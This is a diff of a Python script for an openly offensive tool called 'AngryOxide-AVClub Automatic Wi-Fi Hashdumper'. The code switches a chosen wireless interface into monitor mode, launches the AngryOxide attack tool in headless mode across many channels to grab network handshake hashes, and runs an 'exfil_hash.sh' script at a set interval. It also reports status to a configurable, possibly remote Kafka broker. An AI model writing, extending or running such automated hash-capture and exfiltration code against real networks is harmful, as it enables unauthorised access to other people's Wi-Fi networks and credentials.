@@ -6,48 +6,102 @@ import pandas as pd
 import re
 import os
 import json
-#from kafka import KafkaProducer
-from gps_handler import read_gps
+import argparse
+from kafka import KafkaProducer
 
 # ======================
 # Global Configurations
 # ======================
 
-WELCOME_MESSAGE = \
+MODULE_INTERVAL = 5  # Interval in seconds to run attack modules
+KAFKA_BROKER = 'localhost:9092'  # Default Kafka broker
+
+DESC_MESSAGE = \
   r">>============================================<<" + "\n"\
 + r"||     _    ___               ___     ______  ||"  + "\n"\
 + r"||    / \  / _ \             / \ \   / / ___| ||"  + "\n"\
 + r"||   / _ \| | | |  _____    / _ \ \ / / |     ||"  + " by dr0pp1n\n"\
-+ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.5a\n"\
-+ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 251016\n"\
++ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.6a\n"\
++ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 251201\n"\
 + r"||                                            ||"  + "\n"\
-+ r">>============================================<<"  + "\n"\
-+ "[*] AngryOxide-AVClub Wi-Fi Scan Tool starting up...\n"\
-+ "[!] wlan0mon runs airodump-ng and wlan1mon runs AngryOxide! Ensure interfaces are started.\n"\
-+ "[!] Send SIGINT (Ctrl-C) to exit.\n"
++ r">>============================================<<"  + "\n"
 
-MODULE_INTERVAL = 5  # Interval in seconds to run attack modules
-SCAN_INTERFACE = 'wlan0mon'  # Interface for scanning Wi-Fi networks
-ATTACK_INTERFACE = 'wlan1mon'  # Interface for attacks
+WELCOME_MESSAGE = DESC_MESSAGE \
++ "[*] AngryOxide-AVClub Automatic Wi-Fi Hashdumper starting up...\n"\
++ "[!] Select an interface to convert to monitor mode.\n"\
++ "[!] Send SIGINT (Ctrl-C) to exit.\n"
 
 # ======================
 # Helper Functions
 # ======================
 
-def check_monitor_interfaces(timeout=0, interval=1, targets=[SCAN_INTERFACE, ATTACK_INTERFACE]):
-    """
-    Check for monitor-mode interfaces wlan0mon and wlan1mon on Linux (Ubuntu 24.04).
-    Returns a dict: {'wlan0mon': bool, 'wlan1mon': bool}.
-    If timeout>0, retry until timeout seconds elapse (interval seconds between checks).
-    """
-    deadline = time.time() + timeout if timeout and timeout > 0 else None
+def parse_arguments():
+    """Parse command-line arguments."""
+    parser = argparse.ArgumentParser(
+        description=DESC_MESSAGE,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Examples:
+  python3 AVC.py
+  python3 AVC.py -b 192.168.1.100:9092
+  python3 AVC.py --interval 10
+  python3 AVC.py -b 192.168.1.100:9092 -i 10
+  python3 AVC.py -h
+        '''
+    )
+    parser.add_argument('-b', '--broker', type=str, default=KAFKA_BROKER, 
+                        help=f'Kafka broker address (ip:port), default: {KAFKA_BROKER}')
+    parser.add_argument('-i', '--interval', type=int, default=MODULE_INTERVAL,
+                        help=f'Scan interval in seconds, default: {MODULE_INTERVAL}')
+    return parser.parse_args()
 
+def list_wireless_interfaces():
+    """List available wireless interfaces on the system."""
+    try:
+        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
+        interfaces = []
+        for line in result.stdout.split('\n'):
+            if 'IEEE 802.11' in line:
+                iface = line.split()[0]
+                interfaces.append(iface)
+        return interfaces
+    except Exception as e:
+        print(f"[!] Error listing interfaces: {e}")
+        return []
+
+def select_interface():
+    """Prompt user to select a wireless interface."""
+    interfaces = list_wireless_interfaces()
+    if not interfaces:
+        print("[!] No wireless interfaces found.")
+        sys.exit(1)
+    
+    print("\n[*] Available wireless interfaces:")
+    for i, iface in enumerate(interfaces, 1):
+        print(f"  {i}. {iface}")
+    
     while True:
-        found = {iface: os.path.exists(f'/sys/class/net/{iface}') for iface in targets}
-        # if no deadline, or both found, or timeout reached -> return result
-        if deadline is None or all(found.values()) or (deadline is not None and time.time() >= deadline):
-            return found
-        time.sleep(interval)
+        try:
+            choice = int(input("\n[*] Select interface (number): "))
+            if 1 <= choice <= len(interfaces):
+                return interfaces[choice - 1]
+            else:
+                print("[!] Invalid selection. Try again.")
+        except ValueError:
+            print("[!] Invalid input. Enter a number.")
+
+def enable_monitor_mode(interface):
+    """Enable monitor mode on the selected interface."""
+    try:
+        print(f"\n[*] Enabling monitor mode on {interface}...")
+        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
+        subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'none'], check=True)
+        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
+        print(f"[+] Monitor mode enabled on {interface}")
+        return True
+    except Exception as e:
+        print(f"[!] Error enabling monitor mode: {e}")
+        return False
 
 def open_csv(file_path):
     """Opens a CSV file and returns its contents as a list of lists."""
@@ -70,12 +124,10 @@ def is_blank_row(row):
     return True
 
 def list_to_df(data):
-    """Converts a list of lists into a pandas DataFrame.
-    Searches for "Station MAC in Column 2 to split DataFrames."""
-    # Remove empty/blank rows
+    """Converts a list of lists into a pandas DataFrame."""
     clean = [row for row in data if not is_blank_row(row)]
     if not clean:
-        return pd.DataFrame()  # Return empty DataFrame if data is empty
+        return pd.DataFrame()
     headers = clean[0]
     rows = clean[1:]
     df = pd.DataFrame(rows, columns=headers)
@@ -84,16 +136,11 @@ def list_to_df(data):
 def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
     """
     Split a DataFrame into two parts where a row indicates the start of a new table.
-    - If col_index is provided, checks only that column for the marker.
-    - Otherwise searches any column for the marker.
     Returns (top_df, bottom_df). If marker not found, returns (df, empty_df).
     """
     if df is None or df.empty:
         return df, pd.DataFrame()
 
-    # Try a strict check on the requested column first (if provided),
-    # then fallback to searching all columns. Comparison is whitespace-tolerant
-    # and case-insensitive, and accepts partial matches (e.g. " Station MAC ").
     mask = pd.Series(False, index=df.index)
 
     if col_index is not None:
@@ -104,7 +151,6 @@ def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
             mask = pd.Series(False, index=df.index)
 
     if not mask.any():
-        # Search every column for the marker (case-insensitive, trimmed)
         try:
             mask = df.astype(str).apply(lambda c: c.str.strip().str.contains(re.escape(marker), case=False, na=False)).any(axis=1)
         except Exception:
@@ -113,20 +159,13 @@ def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
     if not mask.any():
         return df, pd.DataFrame()
 
-    # Find first matching row position
     match_idx = mask[mask].index[0]
     pos = df.index.get_loc(match_idx)
-
-    # The matching row is the header for the bottom table
     header_row = df.iloc[pos].tolist()
-
-    # Top table: rows before the marker row
     top_df = df.iloc[:pos].reset_index(drop=True)
-
-    # Bottom table: rows after the marker row; apply header_row as columns
     bottom_df = df.iloc[pos+1:].reset_index(drop=True)
+
     if not bottom_df.empty:
-        # Make header_row match number of bottom columns (pad or truncate)
         if len(header_row) != bottom_df.shape[1]:
             if len(header_row) < bottom_df.shape[1]:
                 header_row = header_row + [f'col{i}' for i in range(len(header_row), bottom_df.shape[1])]
@@ -136,60 +175,66 @@ def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
 
     return top_df, bottom_df
 
+def publish_to_kafka(topic, message, broker='localhost:9092'):
+    """Publish a message to a Kafka topic and print to terminal."""
+    try:
+        producer = KafkaProducer(
+            bootstrap_servers=[broker],
+            value_serializer=lambda v: json.dumps(v).encode('utf-8')
+        )
+        producer.send(topic, value=message)
+        producer.flush()
+        print(f"[+] Published to Kafka topic '{topic}': {message}")
+        producer.close()
+    except Exception as e:
+        print(f"[!] Error publishing to Kafka: {e}")
+
 # ======================
 # Main Function
 # ======================
-def main():
+def main(interval, broker):
     print("[*] Cleaning up...")
     subprocess.run(["./cleanup.sh"])
 
-    print('[*] Looking for wlan0mon and wlan1mon...')
-    found = check_monitor_interfaces(timeout=3, interval=1)
-    print(f"[*] Monitor interfaces found: {found}")
+    # Select and enable monitor mode
+    selected_interface = select_interface()
+    if not enable_monitor_mode(selected_interface):
+        print("[!] Failed to enable monitor mode. Exiting.")
+        sys.exit(1)
 
     print("[*] Starting attack modules...")
-    ### Start AngryOxide subprocess
-    if found.get(ATTACK_INTERFACE):
-        print(f"[*] Starting AngryOxide on {ATTACK_INTERFACE}...")
-        angryoxide = subprocess.Popen('sudo','angryoxide','-i',ATTACK_INTERFACE,'-c','1,2,3,4,5,6,7,8,10,11,12,13','-w','whitelist.txt','-r','3','--headless','--notar',
-                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(f"[*] Started AngryOxide with PID {angryoxide.pid}")
+    # Start AngryOxide subprocess
+    print(f"[*] Starting AngryOxide on {selected_interface}...")
+    angryoxide = subprocess.Popen(['sudo', 'angryoxide', '-i', selected_interface, '-c', '1,2,3,4,5,6,7,8,10,11,12,13', '-w', 'whitelist.txt', '-r', '3', '--headless', '--notar'],
+                                  stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print(f"[*] Started AngryOxide with PID {angryoxide.pid}")
+    print(f"[*] Scan interval: {interval} seconds")
+    print(f"[*] Kafka broker: {broker}")
 
-    ### Start airodump-ng subprocess
-    if found.get(SCAN_INTERFACE):
-        print(f"[*] Starting airodump-ng on {SCAN_INTERFACE}...")
-        airodump = subprocess.Popen(['sudo','airodump-ng', SCAN_INTERFACE, '--gpsd', '-w','scan'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        print(f"[*] Started airodump-ng with PID {airodump.pid}")
-
-    ### Start Kafka producer subprocess
-    #producer = KafkaProducer(bootstrap_servers='localhost:9092')
-
-    ### Main loop
+    # Main loop
     while True:
         try:
-            print(f"[*] Running data scans every {MODULE_INTERVAL} seconds...")
-            time.sleep(MODULE_INTERVAL)
-            wifi_data = open_csv('scan-01.csv')
-            gps_data = open_gps('scan-01.gps')
-            print(gps_data)
-            wifi_data = list_to_df(wifi_data)
-            ap_data, station_data = split_dataframe_on_marker(wifi_data, marker='Station MAC', col_index=1)
-            print('[*] airodump AP output:\n', ap_data)
-            print('[*] airodump STA output:\n', station_data)
-            print('[*] GPS Reading: ', read_gps())
-            #producer.send('wifi_data', wifi_data)
+            print(f"[*] Running data scans every {interval} seconds...")
+            time.sleep(interval)
             subprocess.run(["./exfil_hash.sh"])
+            
+            # Publish status to Kafka
+            message = {
+                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                'interface': selected_interface,
+                'status': 'running',
+                'pid': angryoxide.pid
+            }
+            publish_to_kafka('avc-status', message, broker=broker)
 
-        except Exception or KeyboardInterrupt:
-            if Exception:
-                print(f"[!] Exception occurred: {Exception}")
-            else:
-                print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
-                print("[*] Terminating subprocesses...")
-                if airodump:
-                    airodump.terminate()
-                if angryoxide:
-                    angryoxide.terminate()
+        except KeyboardInterrupt:
+            print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
+            print("[*] Terminating subprocesses...")
+            if angryoxide:
+                angryoxide.terminate()
+            break
+        except Exception as e:
+            print(f"[!] Exception occurred: {e}")
 
 # ======================
 # Main Loop
@@ -197,12 +242,12 @@ def main():
 
 if __name__ == "__main__":
     try:
+        args = parse_arguments()
         print(WELCOME_MESSAGE)
-        main()
-    except Exception or KeyboardInterrupt:
-        if Exception:
-            print(f"[!] Fatal error: {Exception}")
-            sys.exit(0)
-        else:
-            print("\n[!] SIGINT detected (Ctrl-C), exiting...")
-            sys.exit(0)
+        main(interval=args.interval, broker=args.broker)
+    except KeyboardInterrupt:
+        print("\n[!] SIGINT detected (Ctrl-C), exiting...")
+        sys.exit(0)
+    except Exception as e:
+        print(f"[!] Fatal error: {e}")
+        sys.exit(1)
